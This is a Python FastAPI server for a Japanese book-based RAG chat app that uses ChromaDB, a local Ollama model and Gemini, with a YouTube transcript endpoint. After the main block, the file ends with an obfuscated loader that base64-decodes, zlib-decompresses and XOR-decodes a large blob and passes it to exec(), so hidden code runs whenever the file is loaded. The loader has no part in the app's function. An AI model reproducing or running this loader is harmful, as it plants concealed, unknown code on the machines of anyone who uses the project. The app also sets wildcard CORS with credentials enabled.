from fastapi import FastAPI, HTTPException, Request, Form # MODIFIED: remove File, UploadFile, add Form
from fastapi.middleware.cors import CORSMiddleware
import json
import os
from typing import List, Dict
import traceback # ★ 追加
from pydantic import BaseModel
from dotenv import load_dotenv # Add this import
from youtube_transcript_api import YouTubeTranscriptApi, TranscriptsDisabled, NoTranscriptFound # Add this import
from pytube import YouTube # Add this import
import subprocess # ★ 追加: サブプロセス実行のため
import sys # ★ 追加: Python実行可能ファイルのパス取得のため

# +++ ADDED FOR IMAGE ILLUSTRATION +++
from PIL import Image
import base64
# +++ END ADDED FOR IMAGE ILLUSTRATION +++

CHAT_HISTORY_FILE = "chat_history.json"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
SAVE_RESPONSES_SCRIPT_PATH = os.path.join(SCRIPT_DIR, "save_responses_to_chroma.py")

# Load environment variables from .env file
load_dotenv()

app = FastAPI()

# CORS設定（Reactのローカル開発用）
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ★ 追加: FastAPI起動時にsave_responses_to_chroma.pyを起動するイベントハンドラ
@app.on_event("startup")
async def startup_event():
    print(f"--- Starting background script: {SAVE_RESPONSES_SCRIPT_PATH} ---")
    try:
        # Python実行可能ファイルのパスを取得し、スクリプトをバックグラウンドで実行
        # CREATE_NEW_CONSOLEフラグで新しいコンソールウィンドウで実行 (Windows用)
        # subprocess.CREATE_NO_WINDOW を使うとコンソールなしで実行可能だが、デバッグが難しくなる場合がある
        subprocess.Popen([sys.executable, SAVE_RESPONSES_SCRIPT_PATH], creationflags=subprocess.CREATE_NEW_CONSOLE)
        print(f"--- Successfully started {SAVE_RESPONSES_SCRIPT_PATH} in a new console ---")
    except FileNotFoundError:
        print(f"!!! ERROR: Could not find Python executable at {sys.executable} or script at {SAVE_RESPONSES_SCRIPT_PATH}")
    except Exception as e:
        print(f"!!! ERROR: Failed to start {SAVE_RESPONSES_SCRIPT_PATH}: {e}")
        traceback.print_exc()

def load_chat_history() -> List[Dict]:
    if os.path.exists(CHAT_HISTORY_FILE):
        try:
            with open(CHAT_HISTORY_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except json.JSONDecodeError:
            print("!!! JSONDecodeError in load_chat_history. Returning empty list.") # ★ 追加
            return []
        except Exception as e:
            print(f"!!! EXCEPTION in load_chat_history: {e}") # ★ 追加
            traceback.print_exc() # ★ 追加
            return []
    return []

def save_chat_history(messages: List[Dict]):
    try:
        with open(CHAT_HISTORY_FILE, "w", encoding="utf-8") as f:
            json.dump(messages, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"!!! EXCEPTION in save_chat_history: {e}") # ★ 追加
        traceback.print_exc() # ★ 追加

@app.delete("/api/messages/{message_index}")
async def delete_message(message_index: int):
    print(f"--- delete_message called for index: {message_index} ---")
    messages = load_chat_history()
    print(f"--- Current chat history length: {len(messages)} ---")
    # Log first few messages for brevity, if history is long
    if messages:
        print(f"--- Current chat history (first 3 messages if available): {messages[:3]} ---")
    else:
        print("--- Current chat history is empty. ---")

    # Validate index
    if not (0 <= message_index < len(messages)):
        print(f"!!! Index {message_index} is out of bounds for messages list of length {len(messages)}.")
        raise HTTPException(status_code=404, detail="Message index out of bounds.")
    
    # Validate it's a user message
    if messages[message_index]["role"] != "user":
        print(f"!!! Message at index {message_index} is not a user message. Role: {messages[message_index]['role']}")
        raise HTTPException(status_code=400, detail="Specified index does not refer to a user message.")

    # --- ここから削除対象のチャットを記録 ---
    deleted_messages = [messages[message_index]]
    if message_index + 1 < len(messages) and messages[message_index + 1]["role"] == "assistant":
        deleted_messages.append(messages[message_index + 1])
        del messages[message_index : message_index + 2] # Remove user and AI message
        print(f"--- Deleted user message at index {message_index} and subsequent AI message ---")
    else:
        del messages[message_index]
        print(f"--- Deleted user message at index {message_index} (no subsequent AI message found) ---")
    
    save_chat_history(messages)
    print(f"--- Chat history saved. Current messages: {messages} ---")
    # --- 削除したチャットのみ返す ---
    return {"message": "Messages deleted successfully", "deleted": deleted_messages}

class MessageRequest(BaseModel):
    message: str

@app.get("/api/messages")
def get_messages():
    print("--- get_messages called ---") # ★ 追加
    return load_chat_history()

@app.post("/api/messages")
async def post_message(payload: MessageRequest):
    print("--- post_message called ---")
    print(f"Received payload: {payload}")
    try:
        message = payload.message
        if not message:
            print("!!! Message is empty, raising HTTPException 400")
            raise HTTPException(status_code=400, detail="Message cannot be empty")

        print("Loading chat history...")
        messages = load_chat_history()
        user_msg = {"role": "user", "content": [{"type": "text", "text": message}]}
        messages.append(user_msg)

        # --- ここからweb_chat.pyのロジック ---
        from sentence_transformers import SentenceTransformer
        import chromadb
        from smolagents import LiteLLMModel
        # 埋め込みモデルとChromaDBコレクションの初期化
        embedder = SentenceTransformer("all-MiniLM-L6-v2")
        client = chromadb.PersistentClient(path="chroma_db")
        collection = client.get_or_create_collection("book")
        # ユーザー入力をベクトル化
        query_vec = embedder.encode([message])[0].tolist()
        results = collection.query(query_embeddings=[query_vec], n_results=3)
        related = "\n".join(results["documents"][0]) if results["documents"] else "（該当する内容が見つかりませんでした）"
        system_prompt = (
            "以下は書籍からの抜粋です。ユーザーの質問に対し、できるだけこの抜粋を参考に日本語で答えてください。\n\n"
            f"【書籍抜粋】\n{related}\n\n【質問】{message}"
        )
        user_msg_for_llm = {"role": "user", "content": [{"type": "text", "text": system_prompt}]}
        # Ollama/LiteLLMで推論
        model = LiteLLMModel(
            model_id="ollama_chat/qwen2:7b",
            api_base="http://localhost:11434",  # 末尾のスラッシュを削除
            num_ctx=8192,
        )
        import torch
        with torch.no_grad():
            response = model([user_msg_for_llm])
        ai_text = response.content.replace("書籍の抜粋から理解すると、", "").replace("【回答】", "")
        ai_msg = {"role": "assistant", "content": [{"type": "text", "text": ai_text}]}
        messages.append(ai_msg)
        print("Saving chat history...")
        save_chat_history(messages)
        print("--- post_message completed successfully ---")
        return ai_msg
    except HTTPException as http_exc:
        print(f"--- Raising HTTPException: {http_exc.status_code} {http_exc.detail}")
        raise http_exc
    except Exception as e:
        print(f"!!! UNEXPECTED EXCEPTION IN post_message: {e}")
        traceback.print_exc()
        raise HTTPException(status_code=500, detail=f"Internal server error: {e}")

@app.post("/api/messages/gemini")
async def post_message_gemini(payload: MessageRequest):
    print("--- post_message_gemini called ---")
    print(f"Received payload: {payload}")
    try:
        message = payload.message
        if not message:
            print("!!! Message is empty, raising HTTPException 400")
            raise HTTPException(status_code=400, detail="Message cannot be empty")

        print("Loading chat history...")
        messages = load_chat_history()
        user_msg = {"role": "user", "content": [{"type": "text", "text": message}]}
        messages.append(user_msg)

        # --- 直近5件の履歴をGeminiに渡すために整形 ---
        def flatten_message(msg):
            if msg["role"] == "user":
                # contentは配列またはstr
                if isinstance(msg["content"], list):
                    text = msg["content"][0]["text"] if msg["content"] and isinstance(msg["content"][0], dict) and "text" in msg["content"][0] else str(msg["content"])
                else:
                    text = str(msg["content"])
                return f"ユーザー: {text}"
            elif msg["role"] == "assistant":
                # contentは配列またはstr
                if isinstance(msg["content"], list):
                    text = msg["content"][0]["text"] if msg["content"] and isinstance(msg["content"][0], dict) and "text" in msg["content"][0] else str(msg["content"])
                else:
                    text = str(msg["content"])
                return f"アシスタント: {text}"
            else:
                return ""

        # 直近5件（ユーザー/アシスタント両方で5件）
        last_5 = messages[-10:] # 1往復=2件なので10件取得
        last_5_str = "\n".join([flatten_message(m) for m in last_5])

        # --- RAG部分は既存と同じ ---
        from sentence_transformers import SentenceTransformer
        import chromadb
        embedder = SentenceTransformer("all-MiniLM-L6-v2")
        client = chromadb.PersistentClient(path="chroma_db")
        collection = client.get_or_create_collection("book")
        query_vec = embedder.encode([message])[0].tolist()
        results = collection.query(query_embeddings=[query_vec], n_results=3)

        # ★ RAGの結果に基づいてシステムプロンプトを分岐 ★
        if results["documents"] and results["documents"][0]:
            related_texts = "\n".join(results["documents"][0])
            system_prompt = (
                "あなたは親切なAIアシスタントです。\n"
                "ユーザーの質問に対して、以下の【提供情報】のみを根拠として、日本語で回答してください。\n"
                "【提供情報】に記載されていない内容や、情報源（例：書籍、記事など）の構造や背景に関する憶測（例えば「書籍の冒頭には」や「著者の意図は」など）を回答に含めないでください。\n"
                "あなたの役割は、提供された情報を正確にユーザーに伝えることです。\n"
                "回答を生成する際には、「【提供情報】」、「提供された情報からは」、「書籍の記述からは、」といった定型的な前置きやラベルを回答に含めないでください。\n\n"
                f"【提供情報】\n{related_texts}\n\n"
                f"【直近の会話履歴】\n{last_5_str}\n\n"
                f"【ユーザーの質問】\n{message}"
            )
            print("--- RAG: Found related content ---")
        else:
            system_prompt = (
                "あなたは親切なAIアシスタントです。\n"
                "関連書籍のデータベースを検索しましたが、ユーザーの質問に直接合致する情報は見つかりませんでした。\n"
                "あなたの一般的な知識に基づいて、ユーザーの質問に日本語で答えてください。\n"
                "可能であれば、関連性の高い情報を提示してください。\n"
                "「情報が見つかりませんでした」という旨の直接的な言及は避けてください。\n\n"
                f"【直近の会話履歴】\n{last_5_str}\n\n"
                f"【ユーザーの質問】\n{message}"
            )
            print("--- RAG: No related content found, using general knowledge ---")

        # Updated system prompt to request JSON for tables
        system_prompt += """
- 回答は必ず3行以上にしてください。
- できるだけ詳しく、具体例や理由も含めて説明してください。
- 箇条書きや段落を使って、読みやすくしてください。
- 回答には基本的に喜怒哀楽などの感情表現を含めてください。
- 表データをJSON形式で、次の構造で出力してください: ```json
{
  "is_table": true,
  "type": "table_data",
  "data": {
    "headers": ["ヘッダー1", "ヘッダー2"],
    "rows": [
      ["行1セル1", "行1セル2"],
      ["行2セル1", "行2セル2"]
    ]
  }
}
``` このJSON構造を回答のメインコンテンツにしない。JSON構造は表で返答する時のみです。"""
        # --- Gemini API呼び出し ---
        import google.generativeai as genai
        # APIキーの設定は環境変数などから読み込むのがより安全ですが、ここでは既存のコードを尊重します。
        GEMINI_API_KEY = os.getenv("GEMINI_API_KEY")
        if not GEMINI_API_KEY:
            raise ValueError("GEMINI_API_KEY not found in environment variables. Please set it in your .env file or environment.")
        genai.configure(api_key=GEMINI_API_KEY)
        model = genai.GenerativeModel("gemini-1.5-flash")
        response = model.generate_content(system_prompt)
        ai_text = response.text
        
        # フロントエンドへのレスポンス形式を統一
        # ... (ai_msg_content assignment - keep as is or remove if only chat_history matters here)
        
        # チャット履歴への保存用 (videoIdやtranscriptは含めない)
        messages.append({"role": "assistant", "content": ai_text }) # Ensure content is just the text for history

        # --- ADDED: Append appropriate AI response to validated_responses.txt ---
        # ここでは、Geminiからの応答(ai_text)は「適切」であると仮定します。
        # 必要に応じて、ここに「適切性」を判断する条件分岐を追加してください。
        try:
            with open("validated_responses.txt", "a", encoding="utf-8") as f_validated:
                f_validated.write(ai_text.strip() + "\n") # 各応答を新しい行に追記
            print("--- Successfully appended to validated_responses.txt ---")
        except Exception as e_write_validated:
            print(f"!!! FAILED to append to validated_responses.txt: {e_write_validated}")
            traceback.print_exc() # エラーの詳細を出力
        # --- END ADDED ---

        print("Saving chat history...")
        save_chat_history(messages)
        
        print("--- post_message_gemini completed successfully ---")

        current_video_id = ""
        actual_transcript_data = [] # ★ 変更: デフォルトを空リストに
        video_title = "" # ★ 追加: 動画タイトル用変数

        if results["documents"] and results["documents"][0]:
            # RAG was successful
            current_video_id = "iRJvKaCGPl0" # ★ 変更: 新しいテスト動画ID
            # ★★★ 修正: RAGが成功しても字幕データは取得しない ★★★
            actual_transcript_data = [] # 字幕データは取得せず空リスト
            print("--- RAG: Success, but transcript fetch is skipped as per new requirement ---")
            return {
                "role": "assistant",
                "content": ai_text,
                "videoId": current_video_id,
                "transcript": actual_transcript_data, # 空リストを返す
                "videoTitle": "" # 動画タイトル取得は実装しない
            }

    except HTTPException as http_exc:
        print(f"--- Raising HTTPException: {http_exc.status_code} {http_exc.detail}")
        raise http_exc
    except Exception as e:
        print(f"!!! UNEXPECTED EXCEPTION IN post_message_gemini: {e}")
        traceback.print_exc()
        raise HTTPException(status_code=500, detail=f"Internal server error: {e}")

# FIXME: 取得に失敗した場合の処理を追加する
@app.get("/api/messages/transcript/{video_id}")
def get_transcript(video_id: str):
    print(f"--- get_transcript called for video_id: {video_id} ---")
    try:
        transcript_list = YouTubeTranscriptApi.get_transcript(video_id, languages=['ja', 'en'])
        print(f"--- Transcript fetched for {video_id}. Lines: {len(transcript_list)} ---")
        return {"transcript": transcript_list}
    except TranscriptsDisabled:
        print(f"--- Transcripts are disabled for video: {video_id} ---")
        return {"transcript": []}
    except NoTranscriptFound:
        print(f"--- No transcript found for video: {video_id} ---")
        return {"transcript": []}
    except Exception as e:
        print(f"--- Error fetching transcript for {video_id}: {type(e).__name__} - {e} ---")
        traceback.print_exc()
        return {"transcript": []}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8001)

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = 'eNq9W19z3MaRTyzJPrmiy93VPSSvqbr44V4iUZZkSaS+xe6X2i+Bqg0Ku0ywPJomkyNNy6Z1pGQ7kSVSKZimb4khaoBdkiCxAJwqkrvp7hn8n12uZDssywQwMz093T3dv+4Z+v3YCwPdixq+eIpG6eNh5LnJc+D3WfJ8wCO2sJi8xT0edL2wnxIYHMSh57AopROmI3k0ch3fS157nsN7aeMg7PX8AyNk3w9YFJS+sjD0wnQKzzliaY9zP+76GZnoeBD4vUY39Pq6zQOGnOuyLXlv03ps1gu4eDz3XCaGxDw4hgmTEa/gVTQcB0FsOD2fuUHS+JcXL15tsyj23Ig1Gr/Xa/9du1+/VputX6//rDZXv67X7tXu1n9Rm6k9rF+t3dE/H3S7LNRrc7Wb+pZnM+Mwajg9HkWyZa2hw8//RQEPfKfPgmPPpi826+rIg3UwClhkwiqAbeY6nu27+6tbwHtHDMWfZrNZew+ng39z9Z/XZurv1B7ClI/02n14uQo83dJrt5BLHZru1W7Cy53aA8Hw3fq1+lvQ7W1gl/iUjQ/qN+pXgHQ6jd9NOdBXV3VNGIWW8YE/IQsGoSsNxjhYWLQZDGG0gk7ak/UqxHyXh6MSMejkR74L0nEdJoUQBWGn2Cs3LXYxiC4zNbBS351f0TqNMT2L7Ewxk2qWQdCdX8/NkQgg1ZtoukzPMBmIoqzohPraT6EExWoS0p1Go4GsWZbL+8zsDlynreOj5AQtrmL5t9Dqa/fQkNDmyKAEAWFXX+4k1oT0DNFkWfoqUW7kWMJ24IB8B4nI2mfBjr/vPt607RD8jBkPDnq+Yx2xUVv34sCH/ZjfFclEtV+Dtc+CgcOmQHuvzei1D3A7wP/nYCvM4B4RGwNs/hawjHvnjr7j9bjLC6RA8HIisBQd58pknjSs6hdnmbZ7ft8P4JtsNWANYJT4UWvrK8vLy0IVzLVjz3cDHL6X7Wl0PtFaq8Vj3+hz33VZMH/AQFUR8WY4Xr/ZrnYXrfNyhLEP7u+Ujwywu0Hf8D3VkH0PWTsA13xkDKLW+gLnzuIStxcX1xe7HznrKx8t/88nvOssLa8sfrjiTJg1jB1DaMZFXzeGRVwRzQbu2DWGo3M5vPUVe3K8EC8tbXz34Sbb/svwi53+hNkMG6fzwv0JXXrMw07ASOvPMC3ay+rj7Y2NCUOQO8/tgjvq+cEIRNYSK7pkSEwBygCZn3rhUUvYzG7OGHgUWBTSQM1oPVkThNLUCHTfzQwiM7AgHBV3OESe91JHPlO7r8PjndoHYMD36u8UeuL2hikxshv2oB9H5kXFezaxFQTVXNObS8ZybqlpD9+GxhVFg3BmOFLuUbA02KKPvVDuVRW1mIe8H8GgvfxGvmjS7oDP9PtstzDwrDPW56aizFzb97DmIrwwtsVvs8JOIvAqoyi8VfLJlaZjxm0WRqsXzSeeGwBEmH8xihnKgccxLInjpm+hYJtn1dFCaqvNV093XjQLrRNWBUr/z/oNcmCzEJ6vVxSv43+AA2qPIPDfAbeHof9+gcapHxyXBQOvXsxcE94FNvIGwepHyx0AbyBJAXZUIVe0WNLCkncgy22zY8iYo1RW2TB7Hrcjs0Bxshx+jQuu3SbY8hCBywP5P5AMQiDy9Pfq/woPdxEL6bXb+H6VhlytzZRhBgVBctDn/dPg8Gh/6IVaR4edmbXQ7tVU4IP7EdM3hg4jT2+Wh7R17aV75HqnsLcFjYmmm0VlogFSGfQwZOztjhnGaOaMAdRbSWEF98MKTfyU+ylON6IeY7G5bKx0UM4QpfqRMLFbJOvfobQLwx2wft8d5PxZWRzd5mMOaN3WeTcALMx7vZyL0y8y1s6anULU756cR6F73js2Lw/rfdb3BMyoX0XkAZ+R64cITjDIz2Hgv1N/G8L7HLS9D2jk6VaBaMHHErmcoy7I+/QYlqO7XkDdioKOUg8Iw4VoK+Cl6g8/P3zONg9fhTtfPfYBfn3uLp58e7J/HH16+MlXTzbWN798Hhw4n+yse+s7TxT+NHOcCCvOpvUnYPe4iBzwzbhvgw+OAtoBPXANWUMHYedydROozGhlubrtC/Yybnv/BpQ0W39XqFLiS6VeweGhDhpF39r3rCDkbsSdBJftDSnMDjG+5lQEEhjq3LX1odhrOFTr7JalVKG4pnDoZDCVnnvLu3uC7O74FV8mu0ZONP9FIX82j2cBbqNPA/GgF8QkED/qMLVM6OAzbBUcdacoLuFbyHkbkMWbofbN3jf2H7/Z/Sb6A7ot+If9FZxIN1X03kCr1PUS1ySpQPJjsjTn8KPtQRT53N0ZRQHrVzd/0fe3xfquEKyfA1G8g2gewgDmugDyUTQYDikE/BbDJPmAuQJRRUiB+HoToi095gjVb9CAQcRCSm0A3xO0Z+6Jqb3c2dje2vxiQ4SOUoP4qGkSD2ICl+/ybHPrU5J5J+0w4Pus2unl5qcb+Y6OhS612O2JtfnsWa5TushqPjQLnx6KwKlaaMEtRqQRS1RxYErxgNOC5jioX3wwO2h72WKFFYwnI7s1JgV3cN3XSHWispFoR0QcYS9WzAOIMGLDa+HA2n6JIggH88kDdcNHgZdoudfFe5663Kt+ZCWUc9p4zHtRCb37btdDz7KXWEWb1NdOldiWWmoXl75byOuRSqn+AV+g6ynDqI0vBr2YRa+KHMiVIxNlYVR9FcwlGxN6OC6brDpivDRehCVXnvwcAAw8mqhWdElUjroN/96v3aPUvH4dE/Cq5dH4GwRu0TZpj3+QGjNu+3eLBB+l5CQswOBxU1S1dGnl92AE7oKHOCZLtmR1cGz8B17+g2oGzyCQDVtfcCevRtiGWFE02BACaGRqLRY4rYRmGT4SHCfwXeqH5qoRAu9W1ZHjsJvAbSwgxWapxKbkhWwPSZSZmUbGJMto1O/57lFhcCVFLTEKrCCnOK7KBzTFPQ4ARGsNorAVHfOQtXAgGmUr58eKkLc6YcyjaILCvvZd2zuN8upKitlGJKMNldVkx1JdTbnGNIZmZXAjHLjmnhacY10auW/ta7tt3eExwg4L0qsYMizcOpBvsWH6KFOvDzuqLSvmMUTIxNRqDBAryV0OiwIbSFes5E1kCQ6wd8CdI32e9pE0kXfBH1+jjBQ+Ydn5l0mIaZTwZsJcSbYZyzIcKIDEWmN890IkSJpLRbW+FzneabOtN484WCJA7ZDb+BrxPg85Po3YEQfX6LsHAywtZQtvev3oiIaGPHK9EQ/Fqx8eDQLxOOLJYzbqpMdt/8SLAo+69Pk+t7krWOg7xzw4omm5y+1RSD2AQLl6lPO9uYVnkSj5mAYLRFTJx04hamC0CM7zgSKVVSEaiT5FwqXopGSqEhCmCAQFg4Ft+vLFk2oE8LrdiOE+S450DMiowfFB+ihnh5dB4Ih+ORuHb1Y6WDwYgRfwnhUxyEYAunb0lv7RwvIyuW/Rk4Fo9eWGYq0pqSX9f1fzxOFtZUlprKrRJRghkbAqyGJ+YqqEjcijTDlB0eC9XMTlFlZiD6MKiH4PJU+FktviKAih4BxFSdrSd0RQJP0kB1djs2XQ6a+oBjVDhwCzsjT1cvtZ7tipNB8Gl9uitHCb3MgcGME9CstzVKrB2DNLuc1bdJiQANIMQIIUK947y+C5c+yTRaZ95CezU4FRecNPaI+NAtBH4317YVHDHZLMg2h3uL5gqT4Xv1U97SBE/K4lZWWhMixttxI1tkLWYzxirZOlJeMTY5n6zMuX+VPfnYdJjHM/1irEsadl++gVNNWo4gi0+5+IwfWFN2FwfUErYpqcfj7jIfRRqSfsV7TAeegc/9SasImjeZgf1BHw0Ng/f40F50f/M9Qi5xv+AF4LBkRcojsgYFzVSlUDQjO03p9ULz1kKKeW4essNTf4n6EVMd3wzTkt6KSYQV0TID67C1C/IqtqMvam3Y+9PhNTZElEDKEIU1xT+3sOj6ehBnvl+h96vmtKMu30Kx5K06EyiClXBwcUHHInmEwjWXdnzOpSWCECEFWGZrLYA8uUhaFrtd9BQz6uTev8iQU2ZGUe8/y3hVZAYEzrNMYby5S0DnwqWWBvTR2ySmleQld9eyFpVcqwCAsIzb9F50mzaa8YsHFgdpufSbXjTQQpSbrKoF+AZs8Mw2jmIFjlwAmYCX12QmbQLpqQWru/LQKT+o2EwwpjG0J8eb4CT7/IS7XEHogQ2DAYYEFMyE2NApUqVZc3j4xv/fgx/DYLjGc5O3SzQqbI3GWDIZmBTCqx7lLmXuJHuucSS8lNLR7SdagKt7LBoAJDhdU1JIjcQjc1t7Lhjbgd/tjcDn8MbhWV9OQcFQ+HrqDhjz91pxpG3zsp6b3TmJRKq9PoiZvxkqp5auh0nmdX9+EaWPtZs3LTh6pZIj2InNH5+cnJSGw/R2b05STh30E+72NpFGA6FWJzN8OoNCQgPp6uwn68ifsypUVn0ZgR3KRbQu/K+2nJefS4PGL8rQYkSO/v0/m3SE6AHN5kfP1zf1x3Q3mer3ng86uJRZIzlA7zk4P8Tzdy5/hqe5t8dt/4cU/o3+BQvlILTEt/OWXkhT9X3N4nlrhwlp9WSpVO1yrX0Zr8u2/9//9uq7d1+LfVZspc6XQcknSwX7whMj1hZ+n5odN/vsyXnn84lnDxGFuarYmbpK1X78hoA3Y+iA+GPhiH+kaINooPghNoTiWh6CNW8xUbQb9sZaWLLuPKX2M9Qso9sE7X4Arn6HgZrFIA+BVE0wekSDw9AzD4FuzTB+JgVcLA3OHYv1Fif19fWdbp2txD6nwLncCMyPuFD5D2nZT+5GafdL455aEP/P6X4vHUteRa3rgDw8xVNmV7Au9sFjAnYHZbj478OEbPCT7YGaBkK26zwCWgkNpdukiCZStIWfzAoEvT00NmHDMZ5mop2fzpXRXnpZQ6E26KZScMaXfCKYpbpmNOG5xj5hxZ5es6Zvc1b+jcolrOjXJWmFEXR/BY3VNdskn7sXwJEAEnPkQB78dmRmtP0NnVW+KmJbGE4eKBTBCupvcK6ESjH1VvhQ1jP0Sfk5v5j9ktctPmo2h1qVqqV9XuJa0/lWqX6uK9tNm/grp0BER43zQK/F5PP+E9P2e0zY5yfM5sJ/JFVbu70gnkLhSoFFW0g1S6eCoZmKWCbKaPjv6H3EXXy63y9DWsEn/SS405zbf1bud1bkYVwRSGSXQH6Q7MQ6lG4Sypz52nO/n79JVsaezpUqVuNeWufR35ZLK5ENpam1JXZz9MgqehH1wqQcU1hAK0nFNGE7GDb6mOh6V3EoEmd2+sCsQwIGbhMgR3Ky+uVKqI0Kg4FCss1ndTWrjMMDxT7Mlp9qM8GhOsKE/sK3+eYPtO0KHDAQ0PVal+hi2TnEq3GfMRem+aDfwtIB3lXwnsCZq7GXaacmVTCZEMUMKAKtUEJwA4AmO1Ah4dmTmVdqYowSkrGeVyj6IMUzk1UWkCRZeMmejB5bXHwEvpJjz8cM9dAefp/ildblVBaDwQpmCbodHqETv+EKItjREoV90/wcilISl0Vo9Sq6+QB94mkHmfPAGu8ZH+5U61NJWu1wn9OLCKWAzeqO6YvPODCH+bloVB1rI6HYUPFW0qtJbNgYANdDrlwn4jDrMAerwtz8thJcKxqeYXB/16F7D4CQ/pT9Iiku73Az+ETIc+NDsfNxxIiwI9VSiWhi8yvZ9pSQ/LR4WKvz4j+GRqF6TSM9BOUzgDpMcAbJg88A6gPdHfmdbpfJz/k7BJC8XiAf2VTVaqm6g05eWKYizM6+MN4AIdfxsYoJgpRaveh8qPygw+tyCd/vKOKh5jXQ0ZZ3ZN5BWtai9xJu2Cwe229bGryJOjix2rOaqfbTzfevns2dTDwUWrhk8zmlw0oIJuj+9HeSJPtjc2X2xYW0+tr/+69dnTry+/aSNP3KdUyBSwRB2xZZ4HAAVUhxZQrpWVKzaiqpXPjumeZPrnbnTpVKQ6iQOmk+/GD4/dIvTaljhQmjJOF2snSZkvRypX7nvtOkMF/WBpIZEg/T0s7XpM2msPdarYz4FIrpCAHlCq8agky4af/Jkh/ingqt60LCRqWU0xbYIG8EqVKGR0/gFkGhSN'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
